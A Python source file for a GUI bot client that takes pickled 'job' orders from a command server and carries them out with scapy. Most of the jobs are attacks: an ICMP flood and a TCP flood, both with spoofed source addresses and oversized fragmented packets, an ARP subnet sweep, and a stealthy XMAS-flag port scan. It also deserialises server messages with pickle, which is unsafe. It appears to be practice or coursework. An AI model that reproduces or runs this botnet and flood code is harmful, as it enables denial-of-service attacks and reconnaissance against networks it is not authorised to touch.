import socket
import time
import sys
import pickle
import argparse
import threading
import tkinter as tk
from scapy.all import *

class JobSeeker():
     def __init__(self):

          self.PORT = 6000
          self.SERVER = socket.gethostbyname(socket.gethostname()) # Get IP
          self.ADDR = (self.SERVER, self.PORT) 
          self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create client socket
          self.conn.connect(self.ADDR) # Connects socket to remote host

          self.root = tk.Tk()
          #self.root.geometry("200x200")
          self.create_widgets()

          self.add_text(f"Connected to server @ {self.ADDR}\n")
          self.val = "y"
          self.FLOOD_AMOUNT = 10 #FLOOD_AMOUNT * 1000 = Number of packets sent by each bot

          # --- Shared Messages ---

          self.DISCONNECT =        "disconnect"
          self.JOB_REQUEST =       "jobrequest"
          self.JOB_REPORT =        "jobreport"
          self.JOB_COMPLETE =      "completed"
          self.JOB_INCOMPLETE =    "incomplete"
          self.JOB_ASSIGNMENT =    "assignment"
          self.JOB_SUCCESS =       "success"
          self.JOB_FAILURE =       "failure"
          self.COMPLETION_ACK =    "goodjob"

          self.root.mainloop()

     # --- Function Definitions ---

     def create_widgets(self):
          self.window = tk.Frame(self.root)
          self.label = tk.Label(self.window, text = self.conn.getsockname())
          self.display = tk.Text(self.window, yscrollcommand = True, width = 55, height = 15)
          self.get_job = tk.Button(self.window, text = "Request Job", command = self.request_job)
          self.quit = tk.Button(self.window, text = "Disconnect", command = self.disconnect)

          self.window.pack()
          self.label.pack()
          self.display.pack()
          self.get_job.pack()
          self.quit.pack()

     def request_job(self):
          # Creates a thread to prevent GUI from not responding if given a one-to-many job
          # Double array is needed to pass otherwise it is sent as a String
          thread = threading.Thread(target = self.send, args = [[ self.JOB_REQUEST ]])
          thread.start()

     def disconnect(self):
          self.send([ self.DISCONNECT ])
          self.root.destroy()

     def add_text(self, text):
          self.display.insert(tk.INSERT, text)
          self.root.update()

     def send(self, v): # Function to send messages to the server
          # Pickle the message
          try:
               m = pickle.dumps(v)
               self.conn.send(m)

               if v[0] == self.DISCONNECT: 
                    self.add_text("\nDisconnecting from server @ {}\n".format(self.ADDR))
                    self.val = "n"
               else: 
                    self.add_text("\nWaiting for server @ {}\n".format(self.ADDR))
                    m = self.conn.recv(2048)
                    v = pickle.loads(m)
                    if v[0] == self.JOB_ASSIGNMENT:
                         self.add_text("Received a job assignment from server @ {}\n".format(self.ADDR))
                         if v[1] == 1:
                              self.job1(v)
                         elif v[1] == 2:
                              self.job2(v)
                         elif v[1] == 3:
                              self.job3(v)
                         elif v[1] == 4:
                              self.job4(v)
                         elif v[1] == 5:
                              self.job5(v)
                    elif v[0] == self.COMPLETION_ACK:
                         self.add_text("Server @ {0} acknowledged completion\n".format(self.ADDR))
          except Exception as e:
               print(e.__class__," occured")
        
     def job1(self, v):
          self.add_text("\nWorking on job 1 for @ {0}\n".format(self.ADDR))
          host = v[2]
          self.add_text("\nPinging host @ {0}\n".format(host))
          p = sr1(IP(dst=host,ttl=20)/ICMP(), timeout=2, verbose=0)
    
          if p == None:
               self.add_text("The host @ {0} is not online.\n".format(host))
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ])
          else:
               self.add_text("The host @ {0} is online.\n".format(host))
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
        
     def job2(self, v):
          self.add_text(f"Working on job 2 for @ {self.ADDR}\n")
          subnet = v[2]
          self.add_text("Target Subnet: " + subnet  +"\n")
          arp = ARP(pdst=subnet)
          ether = Ether(dst="ff:ff:ff:ff:ff:ff")
          req = ether/arp
          res = srp(req, timeout=2, verbose=0)[0]
          IPs = []
          for sent, rec in res:
               IPs.append(rec.psrc)
          if not IPs:
               self.add_text("No live IP Addresses\n")
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ])
          else:
               self.add_text("Live IP Addresses: " + str(IPs)+"\n")
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
    
     def job3(self, v): #ICMP Flood
          self.add_text(f"ICMP attack commencing on {v[2]} for @ {self.ADDR}\n")
          try:
               ip_layer = IP(dst=v[2], src='192.168.2.1')
               icmp_layer = ICMP()
               packet = ip_layer/icmp_layer
               scapy.all.send(fragment(packet /("X"*60000)), count = 3)
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])
          except:
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ])

     def job4(self, v): #TCP flood attack
          target = v[2]
          port = v[3]
          self.add_text(f"Commencing TCP flood attack on {target} for {self.ADDR}\n")
          try:
               ipLayer = IP(dst=target,src = "192.168.50.146")
               icmpLayer = TCP(dport = port)
               packet = ipLayer/icmpLayer
        
               scapy.all.send(fragment(packet/("X"*60000)), count = 1) #receives no replies for sent packets, count = number of packets sent
        
        
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_SUCCESS ])

          except:
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, self.JOB_FAILURE ]) 

     # extra job created for practice
     def job5(self, v):
          self.add_text(f"\nWorking on job 5 for @ {self.ADDR}\n")
          host = v[2]
          port = v[3]
          sport = RandShort()

          self.add_text(f"Scanning {host}:{port} from :{sport}\n")

          pkt = sr1(IP(dst=host)/TCP(sport=sport, dport=port, flags="FPU"), timeout=1, verbose=0)
    
          if pkt != None:
               if pkt.haslayer(TCP):
                    if pkt[TCP].flags == 20:
                         self.send([ self.JOB_REPORT, self.JOB_COMPLETE, "Closed" ])
                    else:
                         self.add_text("port, TCP flag {pkt[TCP].flag}\n")
               elif pkt.haslayer(ICMP):
                    self.send([ self.JOB_REPORT, self.JOB_COMPLETE, "ICMP resp / filtered\n"])
               else:
                    self.send([ self.JOB_REPORT, self.JOB_COMPLETE, "Unknown resp\n"])
          else:
               self.send([ self.JOB_REPORT, self.JOB_COMPLETE, "Open / filtered\n"])

     # --- Start ---
     def run(self):
          try:
              while True:
                  self.val = input("Would you like a job? (y/n): ")
                  if self.val == "y":
                      self.send([ self.JOB_REQUEST ])
                  else:
                      self.send([ self.DISCONNECT ])
                      sys.exit(0)
          except:
              sys.exit(1)

if __name__ == '__main__':
     jobC = JobSeeker()